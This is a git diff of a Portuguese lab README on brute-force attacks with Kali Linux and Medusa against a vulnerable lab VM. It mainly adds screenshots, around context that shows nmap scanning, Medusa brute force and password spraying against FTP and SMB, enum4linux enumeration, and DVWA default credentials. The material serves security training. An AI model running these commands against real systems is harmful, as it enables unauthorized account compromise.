@@ -63,7 +63,6 @@ Comando utilizado
 > nmap -sV 192.168.170.129
 
 Resultado esperado
-
 Identificação de serviços vulneráveis como:
 * FTP (21)
 * SSH (22)
@@ -77,6 +76,9 @@ O primeiro teste foi realizado contra o serviço FTP presente na máquina vulner
 
 Comando utilizado
 > medusa -h 192.168.170.129 -U users.txt -P pass.txt -M ftp -t 6
+<div align="left">
+  <img src="https://github.com/pjalmeida/-Laborat-rio-de-Ataque-Brute-Force-com-Kali-Linux-e-Medusa/blob/main/images/acessando%20via%20ftp.jpeg" width="300px" alt="Logo do Projeto">
+</div>
 
 **Parâmetros utilizados**
 | Parâmetro | Função             |
@@ -102,6 +104,10 @@ Para simulação de ataques contra aplicações web foi utilizado:
 Acesso à aplicação  
 > http://192.168.170.129/dvwa
 
+<div align="left">
+  <img src="https://github.com/pjalmeida/-Laborat-rio-de-Ataque-Brute-Force-com-Kali-Linux-e-Medusa/blob/main/images/dvwa%20login.jpeg" width="300px" alt="Logo do Projeto">
+</div>
+
 Credenciais padrão:
 > user: admin
 password: password
@@ -122,9 +128,22 @@ Enumeração de usuários
 Ferramenta utilizada:
 > enum4linux 192.168.170.129
 
+<div align="left">
+  <img src="https://github.com/pjalmeida/-Laborat-rio-de-Ataque-Brute-Force-com-Kali-Linux-e-Medusa/blob/main/images/enumeracao%20smb1.jpeg" width="300px" alt="Logo do Projeto">
+</div>
+
 Ataque com Medusa
->medusa -h 192.168.170.129 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
+
+>medusa -h 192.168.170.129 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50--
+<div align="left">
+  <img src="https://github.com/pjalmeida/-Laborat-rio-de-Ataque-Brute-Force-com-Kali-Linux-e-Medusa/blob/main/images/atacando.jpeg" width="300px" alt="Logo do Projeto">
+</div>
+
 Esse ataque demonstra como senhas comuns podem comprometer diversas contas simultaneamente.
+
+<div align="left">
+  <img src="https://github.com/pjalmeida/-Laborat-rio-de-Ataque-Brute-Force-com-Kali-Linux-e-Medusa/blob/main/images/logado%20dvwa.jpeg" width="300px" alt="Logo do Projeto">
+</div>  
 
 # 🛡️ Medidas de Mitigação
 
